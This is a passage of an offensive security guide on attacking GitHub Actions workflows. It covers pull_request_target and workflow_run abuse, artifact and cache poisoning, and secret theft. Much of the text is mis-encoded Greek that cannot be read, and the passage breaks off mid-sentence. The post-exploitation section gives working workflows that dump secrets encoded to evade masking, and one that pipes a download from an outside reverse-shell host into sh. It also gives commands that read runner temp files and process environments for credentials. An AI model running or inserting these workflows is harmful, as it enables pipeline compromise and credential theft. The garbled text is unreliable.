Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î¿ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Ï„Î®Ï‚ ÏÎ¿Î®Ï‚ **`pull_request_target`** **ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ ÏƒÏ„Î¿ Î²Î±ÏƒÎ¹ÎºÏŒ Ï€Î»Î±Î¯ÏƒÎ¹Î¿** ÎºÎ±Î¹ ÏŒÏ‡Î¹ ÏƒÎµ Î±Ï…Ï„ÏŒ Ï€Î¿Ï… Ï€Î±ÏÎ­Ï‡ÎµÏ„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ PR (Î³Î¹Î± **Î½Î± Î¼Î·Î½ ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ Î¼Î· Î±Î¾Î¹ÏŒÏ€Î¹ÏƒÏ„Î¿Î¹ ÎºÏÎ´Î¹ÎºÎµÏ‚**). Î“Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Ï„Î¿ `pull_request_target` [**ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± Î­Î³Î³ÏÎ±Ï†Î±**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target).\
Î•Ï€Î¹Ï€Î»Î­Î¿Î½, Î³Î¹Î± Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏƒÏ‡ÎµÏ„Î¹ÎºÎ¬ Î¼Îµ Î±Ï…Ï„Î® Ï„Î· ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î· ÎµÏ€Î¹ÎºÎ¯Î½Î´Ï…Î½Î· Ï‡ÏÎ®ÏƒÎ·, ÎµÎ»Î­Î³Î¾Ï„Îµ Î±Ï…Ï„Î®Î½ Ï„Î·Î½ [**Î±Î½Î¬ÏÏ„Î·ÏƒÎ· ÏƒÏ„Î¿ blog Ï„Î¿Ï… github**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/).

ÎœÏ€Î¿ÏÎµÎ¯ Î½Î± Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ ÏŒÏ„Î¹ ÎµÏ€ÎµÎ¹Î´Î® Î· **ÎµÎºÏ„ÎµÎ»Î¿ÏÎ¼ÎµÎ½Î· ÏÎ¿Î®** ÎµÎ¯Î½Î±Î¹ Î±Ï…Ï„Î® Ï€Î¿Ï… Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ **Î²Î±ÏƒÎ¹ÎºÏŒ** ÎºÎ±Î¹ **ÏŒÏ‡Î¹ ÏƒÏ„Î¿ PR**, ÎµÎ¯Î½Î±Î¹ **Î±ÏƒÏ†Î±Î»Î­Ï‚** Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Îµ **`pull_request_target`**, Î±Î»Î»Î¬ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ **Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Ï€ÎµÏÎ¹Ï€Ï„ÏÏƒÎµÎ¹Ï‚ ÏŒÏ€Î¿Ï… Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹**.

ÎšÎ±Î¹ Î±Ï…Ï„Î® Î¸Î± Î­Ï‡ÎµÎ¹ **Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬**.

### `workflow_run`

ÎŸ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Ï„Î®Ï‚ [**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run) ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î·Î½ ÎµÎºÏ„Î­Î»ÎµÏƒÎ· Î¼Î¹Î±Ï‚ ÏÎ¿Î®Ï‚ Î±Ï€ÏŒ Î¼Î¹Î± Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÎ® ÏŒÏ„Î±Î½ ÎµÎ¯Î½Î±Î¹ `completed`, `requested` Î® `in_progress`.

Î£Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î¼Î¹Î± ÏÎ¿Î® ÎµÎ¯Î½Î±Î¹ ÏÏ…Î¸Î¼Î¹ÏƒÎ¼Î­Î½Î· Î½Î± ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î¼ÎµÏ„Î¬ Ï„Î·Î½ Î¿Î»Î¿ÎºÎ»Î®ÏÏ‰ÏƒÎ· Ï„Î·Ï‚ Î¾ÎµÏ‡Ï‰ÏÎ¹ÏƒÏ„Î®Ï‚ ÏÎ¿Î®Ï‚ "Run Tests":
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Moreover, according to the docs: The workflow started by the `workflow_run` event is able to **access secrets and write tokens, even if the previous workflow was not**.

This kind of workflow could be attacked if it's **depending** on a **workflow** that can be **triggered** by an external user via **`pull_request`** or **`pull_request_target`**. A couple of vulnerable examples can be [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** The first one consist on the **`workflow_run`** triggered workflow downloading out the attackers code: `${{ github.event.pull_request.head.sha }}`\
The second one consist on **passing** an **artifact** from the **untrusted** code to the **`workflow_run`** workflow and using the content of this artifact in a way that makes it **vulnerable to RCE**.

### `workflow_call`

TODO

TODO: Check if when executed from a pull\_request the used/downloaded code if the one from the origin or from the forked PR

## Abusing Forked Execution

We have mentioned all the ways an external attacker could manage to make a github workflow to execute, now let's take a look about how this executions, if bad configured, could be abused:

### Untrusted checkout execution

In the case of **`pull_request`,** the workflow is going to be executed in the **context of the PR** (so it'll execute the **malicious PRs code**), but someone needs to **authorize it first** and it will run with some [limitations](./#pull\_request).

In case of a workflow using **`pull_request_target` or `workflow_run`** that depends on a workflow that can be triggered from **`pull_request_target` or `pull_request`** the code from the original repo will be executed, so the **attacker cannot control the executed code**.

{% hint style="danger" %}
However, if the **action** has an **explicit PR checkou**t that will **get the code from the PR** (and not from base), it will use the attackers controlled code. For example (check line 12 where the PR code is downloaded):
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

The potentially **untrusted code is being run during `npm install` or `npm build`** as the build scripts and referenced **packages are controlled by the author of the PR**.

{% hint style="warning" %}
A github dork to search for vulnerable actions is: `event.pull_request pull_request_target extension:yml` however, there are different ways to configure the jobs to be executed securely even if the action is configured insecurely (like using conditionals about who is the actor generating the PR).
{% endhint %}

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

Note that there are certain [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) whose values are **controlled** by the **user** creating the PR. If the github action is using that **data to execute anything**, it could lead to **arbitrary code execution:**

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

From the docs: You can make an **environment variable available to any subsequent steps** in a workflow job by defining or updating the environment variable and writing this to the **`GITHUB_ENV`** environment file.

If an attacker could **inject any value** inside this **env** variable, he could inject env variables that could execute code in following steps such as **LD\_PRELOAD** or **NODE\_OPTIONS**.

For example ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) and [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), imagine a workflow that is trusting an uploaded artifact to store its content inside **`GITHUB_ENV`** env variable. An attacker could upload something like this to compromise it:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### Vulnerable Third Party Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

As mentioned in [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), this Github Action allows to access artifacts from different workflows and even repositories.

The thing problem is that if the **`path`** parameter isn't set, the artifact is extracted in the current directory and it can override files that could be later used or even executed in the workflow. Therefore, if the Artifact is vulnerable, an attacker could abuse this to compromise other workflows trusting the Artifact.

Example of vulnerable workflow:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Î‘Ï…Ï„ÏŒ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÏ€Î¹Ï„ÎµÎ¸ÎµÎ¯ Î¼Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ ÏÎ¿Î® ÎµÏÎ³Î±ÏƒÎ¯Î±Ï‚:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## Î†Î»Î»ÎµÏ‚ Î•Î¾Ï‰Ï„ÎµÏÎ¹ÎºÎ­Ï‚ Î ÏÎ¿ÏƒÎ²Î¬ÏƒÎµÎ¹Ï‚

### Î‘Ï€Î±Î³Ï‰Î³Î® Î”Î¹Î±Î³ÏÎ±Ï†Î­Î½Ï„Î¿Ï‚ Namespace Repo

Î•Î¬Î½ Î­Î½Î±Ï‚ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒÏ‚ Î±Î»Î»Î¬Î¾ÎµÎ¹ ÏŒÎ½Î¿Î¼Î±, Î­Î½Î±Ï‚ Î¬Î»Î»Î¿Ï‚ Ï‡ÏÎ®ÏƒÏ„Î·Ï‚ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ³Î³ÏÎ±Ï†ÎµÎ¯ Î¼Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ ÏŒÎ½Î¿Î¼Î± Î¼ÎµÏ„Î¬ Î±Ï€ÏŒ ÎºÎ¬Ï€Î¿Î¹Î¿ Ï‡ÏÎ¿Î½Î¹ÎºÏŒ Î´Î¹Î¬ÏƒÏ„Î·Î¼Î±. Î•Î¬Î½ Î­Î½Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ ÎµÎ¯Ï‡Îµ **Î»Î¹Î³ÏŒÏ„ÎµÏÎ± Î±Ï€ÏŒ 100 Î±ÏƒÏ„Î­ÏÎ¹Î± Ï€ÏÎ¹Î½ Ï„Î·Î½ Î±Î»Î»Î±Î³Î® Î¿Î½ÏŒÎ¼Î±Ï„Î¿Ï‚**, Ï„Î¿ Github Î¸Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎµÎ¹ ÏƒÏ„Î¿Î½ Î½Î­Î¿ ÎµÎ³Î³ÎµÎ³ÏÎ±Î¼Î¼Î­Î½Î¿ Ï‡ÏÎ®ÏƒÏ„Î· Î¼Îµ Ï„Î¿ Î¯Î´Î¹Î¿ ÏŒÎ½Î¿Î¼Î± Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î­Î½Î± **Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ Î¼Îµ Ï„Î¿ Î¯Î´Î¹Î¿ ÏŒÎ½Î¿Î¼Î±** ÏŒÏ€Ï‰Ï‚ Î±Ï…Ï„ÏŒ Ï€Î¿Ï… Î´Î¹Î±Î³ÏÎ¬Ï†Î·ÎºÎµ.

{% hint style="danger" %}
ÎˆÏ„ÏƒÎ¹, ÎµÎ¬Î½ Î¼Î¹Î± ÎµÎ½Î­ÏÎ³ÎµÎ¹Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î­Î½Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ Î±Ï€ÏŒ Î­Î½Î±Î½ Î±Î½ÏÏ€Î±ÏÎºÏ„Î¿ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ, ÎµÎ¯Î½Î±Î¹ Î±ÎºÏŒÎ¼Î± Î´Ï…Î½Î±Ï„ÏŒÎ½ Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÎ¹ Î±Ï…Ï„ÏŒÎ½ Ï„Î¿Î½ Î»Î¿Î³Î±ÏÎ¹Î±ÏƒÎ¼ÏŒ ÎºÎ±Î¹ Î½Î± ÏƒÏ…Î¼Î²Î¹Î²Î¬ÏƒÎµÎ¹ Ï„Î·Î½ ÎµÎ½Î­ÏÎ³ÎµÎ¹Î±.
{% endhint %}

Î•Î¬Î½ Î¬Î»Î»Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÏƒÎ±Î½ **ÎµÎ¾Î±ÏÏ„Î®ÏƒÎµÎ¹Ï‚ Î±Ï€ÏŒ Î±Ï…Ï„Î¬ Ï„Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… Ï‡ÏÎ®ÏƒÏ„Î·**, Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ Î¸Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± Ï„Î± Î±Ï€Î±Î³Î¬Î³ÎµÎ¹. Î•Î´Ï Î­Ï‡ÎµÏ„Îµ Î¼Î¹Î± Ï€Î¹Î¿ Î¿Î»Î¿ÎºÎ»Î·ÏÏ‰Î¼Î­Î½Î· ÎµÎ¾Î®Î³Î·ÏƒÎ·: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## Repo Pivoting

{% hint style="info" %}
Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ ÎµÎ½ÏŒÏ„Î·Ï„Î± Î¸Î± Î¼Î¹Î»Î®ÏƒÎ¿Ï…Î¼Îµ Î³Î¹Î± Ï„ÎµÏ‡Î½Î¹ÎºÎ­Ï‚ Ï€Î¿Ï… Î¸Î± ÎµÏ€Î¹Ï„ÏÎ­ÏˆÎ¿Ï…Î½ Î½Î± **Ï€ÎµÏÎ¬ÏƒÎ¿Ï…Î¼Îµ Î±Ï€ÏŒ Î­Î½Î± Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î¿ ÏƒÎµ Î¬Î»Î»Î¿**, Ï…Ï€Î¿Î¸Î­Ï„Î¿Î½Ï„Î±Ï‚ ÏŒÏ„Î¹ Î­Ï‡Î¿Ï…Î¼Îµ ÎºÎ¬Ï€Î¿Î¹Î± Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ Ï€ÏÏÏ„Î¿ (ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î·Î½ Ï€ÏÎ¿Î·Î³Î¿ÏÎ¼ÎµÎ½Î· ÎµÎ½ÏŒÏ„Î·Ï„Î±).
{% endhint %}

### Î”Î·Î»Î·Ï„Î·ÏÎ¯Î±ÏƒÎ· Cache

ÎœÎ¹Î± cache Î´Î¹Î±Ï„Î·ÏÎµÎ¯Ï„Î±Î¹ Î¼ÎµÏ„Î±Î¾Ï **Ï„Ï‰Î½ ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ‰Î½ workflow ÏƒÏ„Î·Î½ Î¯Î´Î¹Î± branch**. Î‘Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ ÎµÎ¬Î½ Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ **ÏƒÏ…Î¼Î²Î¹Î²Î¬ÏƒÎµÎ¹** Î­Î½Î± **Ï€Î±ÎºÎ­Ï„Î¿** Ï€Î¿Ï… ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ ÏƒÏ„Î·Î½ cache ÎºÎ±Î¹ **ÎºÎ±Ï„ÎµÎ²Î±Î¯Î½ÎµÎ¹** ÎºÎ±Î¹ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Î±Î¹ Î±Ï€ÏŒ Î­Î½Î± **Ï€Î¹Î¿ Ï€ÏÎ¿Î½Î¿Î¼Î¹Î¿ÏÏ‡Î¿** workflow, Î¸Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± **ÏƒÏ…Î¼Î²Î¹Î²Î¬ÏƒÎµÎ¹** ÎºÎ±Î¹ Î±Ï…Ï„ÏŒ Ï„Î¿ workflow.

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### Î”Î·Î»Î·Ï„Î·ÏÎ¯Î±ÏƒÎ· Artifact

Î¤Î± workflows Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎ±Î½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î¿ÏÎ½ **artifacts Î±Ï€ÏŒ Î¬Î»Î»Î± workflows ÎºÎ±Î¹ Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î±**, ÎµÎ¬Î½ Î­Î½Î±Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚ ÎºÎ±Ï„Î±Ï†Î­ÏÎµÎ¹ Î½Î± **ÏƒÏ…Î¼Î²Î¹Î²Î¬ÏƒÎµÎ¹** Ï„Î·Î½ Github Action Ï€Î¿Ï… **Î±Î½ÎµÎ²Î¬Î¶ÎµÎ¹ Î­Î½Î± artifact** Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î±ÏÎ³ÏŒÏ„ÎµÏÎ± Î±Ï€ÏŒ Î¬Î»Î»Î¿ workflow, Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± **ÏƒÏ…Î¼Î²Î¹Î²Î¬ÏƒÎµÎ¹ Ï„Î± Î¬Î»Î»Î± workflows**:

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## ÎœÎµÏ„Î¬ Ï„Î·Î½ Î•ÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ· Î±Ï€ÏŒ Î¼Î¹Î± Î•Î½Î­ÏÎ³ÎµÎ¹Î±

### Î ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ AWS ÎºÎ±Î¹ GCP Î¼Î­ÏƒÏ‰ OIDC

Î•Î»Î­Î³Î¾Ï„Îµ Ï„Î¹Ï‚ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÏƒÎµÎ»Î¯Î´ÎµÏ‚:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### Î ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ <a href="#accessing-secrets" id="accessing-secrets"></a>

Î•Î¬Î½ ÎµÎ¹ÏƒÎ¬Î³ÎµÏ„Îµ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ ÏƒÎµ Î­Î½Î± ÏƒÎµÎ½Î¬ÏÎ¹Î¿, ÎµÎ¯Î½Î±Î¹ ÎµÎ½Î´Î¹Î±Ï†Î­ÏÎ¿Î½ Î½Î± Î³Î½Ï‰ÏÎ¯Î¶ÎµÏ„Îµ Ï€ÏÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬:

* Î•Î¬Î½ Ï„Î¿ Î¼Ï…ÏƒÏ„Î¹ÎºÏŒ Î® Ï„Î¿ token Î­Ï‡ÎµÎ¹ Î¿ÏÎ¹ÏƒÏ„ÎµÎ¯ ÏƒÎµ Î¼Î¹Î± **Î¼ÎµÏ„Î±Î²Î»Î·Ï„Î® Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚**, Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï€ÏÎ¿ÏƒÏ€ÎµÎ»Î±ÏƒÏ„ÎµÎ¯ Î¬Î¼ÎµÏƒÎ± Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ **`printenv`**.

<details>

<summary>Î›Î¯ÏƒÏ„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÏÎ½ ÏƒÏ„Î·Î½ Î­Î¾Î¿Î´Î¿ Ï„Î·Ï‚ Github Action</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Î Î¬ÏÏ„Îµ Î±Î½Ï„Î¯ÏƒÏ„ÏÎ¿Ï†Î· Î¸Î®ÎºÎ· Î¼Îµ Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* Î‘Î½ Ï„Î¿ Î¼Ï…ÏƒÏ„Î¹ÎºÏŒ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ **Î¬Î¼ÎµÏƒÎ± ÏƒÎµ Î¼Î¹Î± Î­ÎºÏ†ÏÎ±ÏƒÎ·**, Ï„Î¿ Ï€Î±ÏÎ±Î³ÏŒÎ¼ÎµÎ½Î¿ shell script Î±Ï€Î¿Î¸Î·ÎºÎµÏÎµÏ„Î±Î¹ **ÏƒÏ„Î¿Î½ Î´Î¯ÏƒÎºÎ¿** ÎºÎ±Î¹ ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î¿.
* ```bash
cat /home/runner/work/_temp/*
```
* Î“Î¹Î± Ï„Î¹Ï‚ JavaScript actions, Ï„Î± Î¼Ï…ÏƒÏ„Î¹ÎºÎ¬ Î±Ï€Î¿ÏƒÏ„Î­Î»Î»Î¿Î½Ï„Î±Î¹ Î¼Î­ÏƒÏ‰ Î¼ÎµÏ„Î±Î²Î»Î·Ï„ÏÎ½ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½Ï„Î¿Ï‚.
* ```bash
ps axe | grep node
```
* Î“Î¹Î± Î¼Î¹Î± **Ï€ÏÎ¿ÏƒÎ±ÏÎ¼Î¿ÏƒÎ¼Î­Î½Î· ÎµÎ½Î­ÏÎ³ÎµÎ¹Î±**, Î¿ ÎºÎ¯Î½Î´Ï…Î½Î¿Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î´Î¹Î±Ï†Î­ÏÎµÎ¹ Î±Î½Î¬Î»Î¿Î³Î± Î¼Îµ Ï„Î¿ Ï€ÏÏ‚ Î­Î½Î± Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Ï„Î¿ Î¼Ï…ÏƒÏ„Î¹ÎºÏŒ Ï€Î¿Ï… Î±Ï€Î­ÎºÏ„Î·ÏƒÎµ Î±Ï€ÏŒ Ï„Î¿ **ÎµÏ€Î¹Ï‡ÎµÎ¯ÏÎ·Î¼Î±**:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### ÎšÎ±Ï„Î¬Ï‡ÏÎ·ÏƒÎ· Î‘Ï…Ï„Î¿Ï†Î¹Î»Î¿Î¾ÎµÎ½Î¿ÏÎ¼ÎµÎ½Ï‰Î½ ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„ÏÎ½

ÎŸ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï€Î¿Î¹ÎµÏ‚ **Github Actions ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ ÏƒÎµ Ï…Ï€Î¿Î´Î¿Î¼Î® ÎµÎºÏ„ÏŒÏ‚ Github** ÎµÎ¯Î½Î±Î¹ Î½Î± Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÏ„Îµ **`runs-on: self-hosted`** ÏƒÏ„Î· Î´Î¹Î±Î¼ÏŒÏÏ†Ï‰ÏƒÎ· yaml Ï„Î·Ï‚ Github Action.

ÎŸÎ¹ **Î±Ï…Ï„Î¿Ï†Î¹Î»Î¿Î¾ÎµÎ½Î¿ÏÎ¼ÎµÎ½Î¿Î¹** ÎµÎºÏ„ÎµÎ»ÎµÏƒÏ„Î­Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡Î¿Ï…Î½ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÎµ **ÎµÏ€Î¹Ï€Î»Î­Î¿Î½ ÎµÏ…Î±Î¯ÏƒÎ¸Î·Ï„ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚**, ÏƒÎµ Î¬Î»Î»Î± **Î´Î¹ÎºÏ„Ï…Î±ÎºÎ¬ ÏƒÏ…ÏƒÏ„Î®Î¼Î±Ï„Î±** (ÎµÏ…Î¬Î»Ï‰Ï„Î± ÏƒÎ·Î¼ÎµÎ¯Î± ÏƒÏ„Î¿ Î´Î¯ÎºÏ„Ï…Î¿; Ï…Ï€Î·ÏÎµÏƒÎ¯Î± Î¼ÎµÏ„Î±Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½;) Î®, Î±ÎºÏŒÎ¼Î· ÎºÎ±Î¹ Î±Î½ ÎµÎ¯Î½Î±Î¹ Î±Ï€Î¿Î¼Î¿Î½Ï‰Î¼Î­Î½Î¿Î¹ ÎºÎ±Î¹ ÎºÎ±Ï„Î±ÏƒÏ„ÏÎ±Ï†Î¿ÏÎ½, **Ï€ÎµÏÎ¹ÏƒÏƒÏŒÏ„ÎµÏÎµÏ‚ Î±Ï€ÏŒ Î¼Î¯Î± ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½Ï„Î±Î¹ 